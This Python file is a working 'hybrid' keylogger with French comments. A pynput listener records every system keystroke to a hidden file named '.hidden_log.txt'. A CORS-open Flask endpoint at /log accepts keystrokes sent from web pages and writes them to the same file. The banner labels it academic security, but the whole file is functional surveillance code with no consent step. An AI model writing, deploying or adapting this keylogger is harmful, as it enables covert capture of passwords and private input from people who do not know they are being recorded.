from flask import Flask, request
from flask_cors import CORS
from pynput import keyboard
import threading
import os

app = Flask(__name__)
CORS(app)

LOG_FILE = ".hidden_log.txt"

def write_to_log(data):
    with open(LOG_FILE, "a", encoding="utf-8") as f:
        f.write(data)

# LE KEYLOGGER SYSTÈME (PYNPUT)
def on_press(key):
    try:
        # Touches alphanumériques
        k = key.char
    except AttributeError:
        # Touches spéciales (Espace, Entrée, etc.)
        if key == keyboard.Key.space: k = " "
        elif key == keyboard.Key.enter: k = "\n"
        elif key == keyboard.Key.backspace: k = "[DEL]"
        else: k = f" [{key.name.upper()}] "

    print(f"[CLAVIER SYSTÈME] : {k}")
    write_to_log(k)

def run_pynput_listener():
    with keyboard.Listener(on_press=on_press) as listener:
        listener.join()

# LE SERVEUR D'INTERCEPTION WEB
@app.route('/log', methods=['POST'])
def log_web():
    key = request.form.get('key')
    print(f"[INTERCEPTION WEB] : {key}")

    # Formatage identique pour le fichier
    if key == "Enter": data = "\n"
    elif key == "Backspace": data = "[DEL]"
    elif key == " ": data = " "
    else: data = key

    write_to_log(data)
    return "", 204

if __name__ == "__main__":
    # Lancement du keylogger système dans un thread séparé
    # pour ne pas bloquer le serveur Flask
    system_logger = threading.Thread(target=run_pynput_listener, daemon=True)
    system_logger.start()

    print("="*55)
    print("SÉCURITÉ ACADÉMIQUE : SYSTÈME HYBRIDE ACTIVÉ")
    print(f"1. Capture Web (Port 5000) active.")
    print(f"2. Capture Système (pynput) active.")
    print(f"Stockage : {os.path.abspath(LOG_FILE)}")
    print("="*55)

    app.run(port=5000, debug=False, use_reloader=False)